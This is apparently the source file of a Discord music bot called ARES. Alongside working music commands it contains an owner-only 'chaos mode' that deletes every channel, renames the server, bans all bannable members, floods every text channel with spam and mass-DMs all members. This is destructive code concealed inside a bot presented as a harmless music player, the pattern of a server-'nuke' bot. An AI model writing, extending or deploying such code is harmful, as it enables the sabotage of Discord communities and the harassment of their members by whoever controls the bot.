require('dotenv').config();

const { Client, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');
const { DisTube } = require('distube');
const { YtDlpPlugin } = require('@distube/yt-dlp');
const ytSearch = require('yt-search');
const lyricsFinder = require('lyrics-finder');
const express = require('express');

// === CONFIG ===
const OWNER_ID = process.env.OWNER_ID;
const NUKE_PASSCODE = process.env.NUKE_PASSCODE;
const TOKEN = process.env.BOT_TOKEN;
const YTDLP_COOKIES = process.env.YTDLP_COOKIES;

// === EXPRESS SERVER (RENDER-FRIENDLY PING) ===
const app = express();
app.get('/', (req, res) => res.send('ARES stays woke 😈'));
app.listen(3000, () => console.log('🌐 Web server active at port 3000'));

// === DISCORD CLIENT ===
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

// === DISTUBE SETUP ===
const distube = new DisTube(client, {
  plugins: [
    new YtDlpPlugin({
      cookies: YTDLP_COOKIES
    })
  ]
});

distube
  .on('playSong', (queue, song) => console.log(`🎶 Playing: ${song.name}`))
  .on('finish', queue => console.log('✅ Finished playing queue.'))
  .on('error', (channel, error) => {
    console.error('[DISTUBE ERROR]', error);
    if (channel) channel.send('❌ An error occurred during music playback.');
  })
  .on('disconnect', queue => console.warn('⚠️ Bot was disconnected from VC.'))
  .on('empty', queue => queue.textChannel.send('❌ Voice channel is empty, stopping playback.'));

// === BOT READY EVENT ===
client.once('ready', () => {
  console.log(`ARES is online as ${client.user.tag} 💋`);
  client.user.setPresence({
    activities: [{ name: 'nihilistic poetries', type: 0 }],
    status: 'online'
  });
});

// === COMMAND HANDLER ===
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild || !message.content.startsWith('!')) return;

  const [cmd, ...args] = message.content.slice(1).split(/ +/);
  const query = args.join(' ');

  if (cmd === 'play') {
    if (!message.member.voice.channel) return message.reply('Join a VC first!');
    let track = query;
    if (!query.startsWith('http')) {
      const r = await ytSearch(query);
      if (!r.videos.length) return message.reply("No song found, babe 😭");
      track = r.videos[0].url;

      const embed = new EmbedBuilder()
        .setTitle('🎶 Now Playing')
        .setDescription(`[${r.videos[0].title}](${r.videos[0].url})`)
        .setThumbnail(r.videos[0].thumbnail)
        .setColor('Blurple');
      message.channel.send({ embeds: [embed] });
    }
    distube.play(message.member.voice.channel, track, {
      textChannel: message.channel,
      member: message.member
    });
  }

  else if (cmd === 'pause') {
    distube.pause(message);
    message.channel.send('⏸ Paused.');
  }

  else if (cmd === 'resume') {
    distube.resume(message);
    message.channel.send('▶ Resumed.');
  }

  else if (cmd === 'stop') {
    distube.stop(message);
    message.channel.send('🛑 Stopped.');
  }

  else if (cmd === 'skip') {
    distube.skip(message);
    message.channel.send('⏭ Skipped.');
  }

  else if (cmd === 'volume') {
    const vol = parseInt(args[0]);
    const q = distube.getQueue(message);
    if (!q || isNaN(vol) || vol < 0 || vol > 100) return;
    q.setVolume(vol);
    message.channel.send(`🔊 Volume set to ${vol}%`);
  }

  else if (cmd === 'loop') {
    const mode = distube.setRepeatMode(message);
    const modes = ["Off", "Song", "Queue"];
    message.channel.send(`🔁 Loop mode: ${modes[mode]}`);
  }

  else if (cmd === 'autoplay') {
    distube.toggleAutoplay(message);
    message.channel.send('🔄 Autoplay toggled.');
  }

  else if (cmd === 'shuffle') {
    const q = distube.getQueue(message);
    if (!q) return message.channel.send("Nothing to shuffle, love.");
    q.shuffle();
    message.channel.send('🔀 Shuffled.');
  }

  else if (cmd === 'queue_list') {
    const q = distube.getQueue(message);
    if (!q) return message.channel.send('🎷 Queue is empty!');
    message.channel.send(q.songs.map((s, i) => `${i + 1}. ${s.name}`).join('\n'));
  }

  else if (cmd === 'lyrics') {
    const q = distube.getQueue(message);
    if (!q) return message.channel.send("No song playing.");
    const song = q.songs[0].name;
    const lyrics = await lyricsFinder("", song) || "Lyrics not found 😭";
    message.channel.send(`📄 **Lyrics for ${song}**:\n\n${lyrics.slice(0, 1999)}`);
  }

  // === CHAOS MODE ===
  if (message.author.id === OWNER_ID) {
    if (cmd === 'nuke') {
      if (query !== NUKE_PASSCODE) return message.reply('❌ Wrong passcode.');
      try { await message.channel.send('💣 Nuking in progress... hold tight 😈'); } catch (e) {}
      message.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
      try { await message.guild.setName('☠ ARES DOMINATES ☠'); } catch (e) {}
      setTimeout(async () => {
        for (let i = 0; i < 5; i++) {
          try { await message.guild.channels.create({ name: 'nuked-by-ARES' }); } catch (e) {}
        }
      }, 5000);
    }

    else if (cmd === 'killall') {
      const members = await message.guild.members.fetch();
      for (const m of members.values()) {
        if (m.id !== OWNER_ID && m.bannable) {
          try { await m.ban(); } catch (e) {}
        }
      }
    }

    else if (cmd === 'rename') {
      await message.guild.setName(query);
      message.channel.send(`🔁 Renamed to: ${query}`);
    }

    else if (cmd === 'spam') {
      const count = parseInt(args[0]);
      const msg = args.slice(1).join(' ');
      message.guild.channels.cache
        .filter(c => c.isTextBased())
        .forEach(c => {
          for (let i = 0; i < count; i++) {
            c.send(msg).catch(() => {});
          }
        });
    }

    else if (cmd === 'deletechannels') {
      message.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
    }

    else if (cmd === 'massdm') {
      const dm = args.join(' ');
      const members = await message.guild.members.fetch();
      for (const m of members.values()) {
        if (!m.user.bot) {
          try { await m.send(dm); } catch (e) {}
        }
      }
    }
  }
});

// === CRASH PROTECTION ===
process.on('unhandledRejection', (reason, p) => console.error('[UNHANDLED REJECTION]', reason));
process.on('uncaughtException', err => console.error('[UNCAUGHT EXCEPTION]', err));

// === LOGIN ===
client.login(TOKEN);
